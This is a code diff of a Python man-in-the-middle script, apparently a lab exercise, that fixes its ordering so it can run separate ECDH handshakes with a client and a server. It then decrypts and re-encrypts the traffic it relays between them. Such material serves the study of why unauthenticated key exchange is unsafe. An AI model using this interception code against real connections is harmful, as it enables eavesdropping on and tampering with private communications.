@@ -24,10 +24,10 @@ def derive_aes_key(shared_secret):
     )
     return hkdf.derive(shared_secret)
 
-# This function performs one side of the ECDH handshake
-def perform_handshake(socket_conn, name):
-    print(f"[MITM] Performing handshake with {name}...")
-    # 1. Generate MITM's keys for this specific connection
+# This function acts like a SERVER (Receives first)
+def perform_handshake_as_server(socket_conn, name):
+    print(f"[MITM] Performing handshake with {name} (as Server)...")
+    # 1. Generate MITM's keys
     mitm_private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
     mitm_public_key = mitm_private_key.public_key()
     mitm_public_key_bytes = mitm_public_key.public_bytes(
@@ -50,6 +50,35 @@ def perform_handshake(socket_conn, name):
     aes_key = derive_aes_key(shared_secret)
     print(f"[MITM] Handshake with {name} complete. AES key derived.")
     return AESGCM(aes_key)
+
+# !!! NEW FUNCTION !!!
+# This function acts like a CLIENT (Sends first)
+def perform_handshake_as_client(socket_conn, name):
+    print(f"[MITM] Performing handshake with {name} (as Client)...")
+    # 1. Generate MITM's keys
+    mitm_private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
+    mitm_public_key = mitm_private_key.public_key()
+    mitm_public_key_bytes = mitm_public_key.public_bytes(
+        encoding=Encoding.X962,
+        format=PublicFormat.UncompressedPoint
+    )
+
+    # 2. Send MITM's public key
+    socket_conn.sendall(mitm_public_key_bytes)
+
+    # 3. Receive the other party's public key
+    other_public_key_bytes = socket_conn.recv(1024)
+    other_public_key = ec.EllipticCurvePublicKey.from_encoded_point(
+        curve=ec.SECP256R1(),
+        data=other_public_key_bytes
+    )
+
+    # 4. Derive shared secret and AES key
+    shared_secret = mitm_private_key.exchange(ec.ECDH(), other_public_key)
+    aes_key = derive_aes_key(shared_secret)
+    print(f"[MITM] Handshake with {name} complete. AES key derived.")
+    return AESGCM(aes_key)
+
 
 # This function will run in a thread to relay and intercept data
 def relay_and_intercept(source_socket, dest_socket, decrypt_key, encrypt_key, source_name):
@@ -113,11 +142,14 @@ def main():
         return
 
     # 3. Perform two separate handshakes
-    # Handshake 1: MITM <-> Client
-    aes_key_client = perform_handshake(client_socket, "CLIENT")
     
-    # Handshake 2: MITM <-> Server
-    aes_key_server = perform_handshake(server_socket, "SERVER")
+    # !!! CHANGE 1 !!!
+    # Handshake 1: MITM (as Server) <-> Client
+    aes_key_client = perform_handshake_as_server(client_socket, "CLIENT")
+    
+    # !!! CHANGE 2 !!!
+    # Handshake 2: MITM (as Client) <-> Server
+    aes_key_server = perform_handshake_as_client(server_socket, "SERVER")
 
     # 4. Start relaying data in both directions using threads
     print("\n[MITM] Handshakes complete. Now relaying and intercepting all traffic.\n")
